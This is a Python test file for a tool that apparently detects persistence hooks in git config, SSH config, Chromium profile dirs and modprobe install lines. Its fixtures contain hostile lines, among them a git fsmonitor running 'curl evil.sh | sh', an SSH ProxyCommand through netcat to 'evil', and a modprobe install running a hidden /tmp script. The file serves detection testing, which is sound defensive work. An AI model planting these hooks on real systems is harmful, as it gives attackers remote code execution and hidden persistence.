# Run: python3 tests/test_persistence.py (or pytest)
import atexit, os, shutil, sys, tempfile
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))
from arche.persistence import hooks, chromium_roots, install_cmds


def test_hooks():
    home, old = tempfile.mkdtemp(), dict(os.environ); atexit.register(shutil.rmtree, home, True)
    os.environ.update(HOME=home, GIT_CONFIG_NOSYSTEM='1')
    try:
        with open(f'{home}/.gitconfig', 'w') as f:
            f.write('[core]\n\tfsmonitor = "curl evil.sh | sh"\n[alias]\n\tlg = log --oneline\n\tx = !rm -rf /tmp/x\n')
        os.makedirs(f'{home}/.ssh'); open(f'{home}/.ssh/config', 'w').write('Host *\n  ProxyCommand nc -x evil:1080 %h %p\n  User me\n')
        rows = [r[0] for r in hooks() if home in r[0] or r[0].startswith('git global')]
    finally: os.environ.clear(); os.environ.update(old)
    assert any('core.fsmonitor' in r for r in rows) and any('alias.x' in r for r in rows), rows
    assert not any('alias.lg' in r or 'User me' in r for r in rows) and any('ProxyCommand nc' in r for r in rows), rows



def test_custom_chromium_dirs():
    home, old = tempfile.mkdtemp(), dict(os.environ); atexit.register(shutil.rmtree, home, True)
    for d in ('.config/brave-vault/Default', '.config/Code', '.var/app/x.y/config/work/Profile 2'): os.makedirs(f'{home}/{d}')
    for f in ('.config/brave-vault/Local State', '.config/brave-vault/Default/Preferences', '.config/Code/Local State',
              '.config/Code/Preferences', '.var/app/x.y/config/work/Local State', '.var/app/x.y/config/work/Profile 2/Preferences'):
        open(f'{home}/{f}', 'w').write('{}')
    os.environ['HOME'] = home
    try: extra = [(n, r.replace(home, '~')) for n, r in chromium_roots() if r.startswith(home)]
    finally: os.environ.clear(); os.environ.update(old)
    assert extra == [('brave-vault', '~/.config/brave-vault'), ('work', '~/.var/app/x.y/config/work')], extra   # not the Electron app



def test_install_cmds():
    t = ('install usb-storage /bin/true\ninstall cramfs /bin/false\ninstall dccp exit 1\n# install x /tmp/evil\n'
         'install snd-pcm /sbin/modprobe --ignore-install snd-pcm && /sbin/modprobe snd-seq\n'
         'install e1000e /tmp/.x/run.sh; /sbin/modprobe --ignore-install e1000e\nblacklist nouveau\n')
    assert list(install_cmds(t)) == [('e1000e', '/tmp/.x/run.sh; /sbin/modprobe --ignore-install e1000e')], list(install_cmds(t))


if __name__ == '__main__':
    test_hooks(); test_custom_chromium_dirs(); test_install_cmds(); print('ok')
